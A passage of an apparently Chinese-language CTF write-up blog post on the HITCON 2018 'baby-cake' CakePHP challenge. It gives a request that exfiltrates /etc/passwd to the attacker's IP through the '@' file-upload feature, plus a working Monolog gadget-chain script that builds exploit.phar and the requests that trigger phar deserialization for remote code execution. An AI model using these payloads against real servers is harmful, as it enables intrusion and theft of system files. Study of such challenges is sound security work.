&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_parts[] = <span class="keyword">$this</span>-&gt;newPart($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add multiple parts at once.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Iterates the parameter and adds all the key/values.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data Array of data to add.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addMany</span><span class="params">(array $data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;add($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add either a file reference (string starting with @)</span></span><br><span class="line"><span class="comment">     * or a file handle.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $name The name to use.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value Either a string filename, or a filehandle.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Cake\Http\Client\FormDataPart</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_hasFile = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="keyword">false</span>;</span><br><span class="line">        $contentType = <span class="string">'application/octet-stream'</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource($value)) &#123;</span><br><span class="line">            $content = stream_get_contents($value);</span><br><span class="line">            <span class="keyword">if</span> (stream_is_local($value)) &#123;</span><br><span class="line">                $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">                $metadata = stream_get_meta_data($value);</span><br><span class="line">                $contentType = $finfo-&gt;file($metadata[<span class="string">'uri'</span>]);</span><br><span class="line">                $filename = basename($metadata[<span class="string">'uri'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">            $value = substr($value, <span class="number">1</span>);</span><br><span class="line">            $filename = basename($value);</span><br><span class="line">            $content = file_get_contents($value);</span><br><span class="line">            $contentType = $finfo-&gt;file($value);</span><br><span class="line">        &#125;</span><br><span class="line">        $part = <span class="keyword">$this</span>-&gt;newPart($name, $content);</span><br><span class="line">        $part-&gt;type($contentType);</span><br><span class="line">        <span class="keyword">if</span> ($filename) &#123;</span><br><span class="line">            $part-&gt;filename($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;add($part);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $part;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p>
+<p>addMany将键和值加入到formData中，再由add函数来对这些值进行判断，当值以@开头时，会由addfile处理，然后file_get_contents可获得value提交的文件的值，然后<br>所以当我们提交<br>?url=yourip&amp;data[‘x’]=@/etc/passwd, 服务器会向我们的ip发送有/etc/passwd的请求</p>
+<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><p>现在来考虑这里是怎样存在远程代码执行的</p>
+<ul>
+<li>phar:// 提取文件时会进行反序列化</li>
+</ul>
+<p>我们使用php对象注入方法，来创建payload并将其放在phar文件中，然后使用get提交url=$ip/xxx.phar文件，那么此时这个文件就保存在了缓存中，我们再使用post方法利用phar://读取这个缓存文件，那么反序列化时造成远程代码执行。</p>
+<p>首先我们先利用gadget来进行对象注入。构造payload的方法，可以使用这个工具<br><a href="https://github.com/ambionics/phpggc/tree/master/gadgetchains/Monolog/RCE/1" target="_blank" rel="noopener">https://github.com/ambionics/phpggc/tree/master/gadgetchains/Monolog/RCE/1</a><br>这里借用一下PDKT-Team的payload。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Monolog</span>\<span class="title">Handler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">SyslogUdpHandler</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">socket</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($x)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;socket = $x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BufferHandler</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handler;</span><br><span class="line">        <span class="keyword">protected</span> $bufferSize = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">protected</span> $buffer;</span><br><span class="line">        <span class="comment"># ($record['level'] &lt; $this-&gt;level) == false</span></span><br><span class="line">        <span class="keyword">protected</span> $level = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> $initialized = <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment"># ($this-&gt;bufferLimit &gt; 0 &amp;&amp; $this-&gt;bufferSize === $this-&gt;bufferLimit) == false</span></span><br><span class="line">        <span class="keyword">protected</span> $bufferLimit = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">protected</span> $processors;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($methods, $command)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processors = $methods;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer = [$command];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">clone</span> <span class="keyword">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">cmd</span> = "<span class="title">ls</span> -<span class="title">alt</span>";</span><br><span class="line"></span><br><span class="line">    $obj = <span class="keyword">new</span> \Monolog\Handler\SyslogUdpHandler(</span><br><span class="line">        <span class="keyword">new</span> \Monolog\Handler\BufferHandler(</span><br><span class="line">            [<span class="string">'current'</span>, <span class="string">'system'</span>],</span><br><span class="line">            [$cmd, <span class="string">'level'</span> =&gt; <span class="keyword">null</span>]</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">'exploit.phar'</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">'test'</span>, <span class="string">'test'</span>);</span><br><span class="line">    $phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line">    $phar-&gt;setMetadata($obj);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>随后我们使用GET访问<br><code>?url=http://myip/exploit.phar</code><br>这个就会保留在服务器缓存中/var/www/html/tmp/cache/my_cache/myip/md5(<a href="http://myip/exploit.phar)/body.cache" target="_blank" rel="noopener">http://myip/exploit.phar)/body.cache</a><br>然后使用post访问读取<br>`?url=<a href="http://myip&amp;data[x]=@phar:///var/www/html/tmp/cache/my_cache/myip/md5(http://myip/exploit.phar)/body.cache" target="_blank" rel="noopener">http://myip&amp;data[x]=@phar:///var/www/html/tmp/cache/my_cache/myip/md5(http://myip/exploit.phar)/body.cache</a><br>执行命令，返回响应<br><img src="https://i.loli.net/2018/11/30/5c00fa794f8e3.png" alt=""></p>
+<p>参考<br><a href="https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf" target="_blank" rel="noopener">https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf</a><br><a href="https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake" target="_blank" rel="noopener">https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/10/2018-04-10-Some/" rel="next" title="Some攻击方式的探究">
+                <i class="fa fa-chevron-left"></i> Some攻击方式的探究
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">palm</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-追踪"><span class="nav-number">1.</span> <span class="nav-text">1 追踪</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程代码执行"><span class="nav-number">2.</span> <span class="nav-text">远程代码执行</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">palm</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
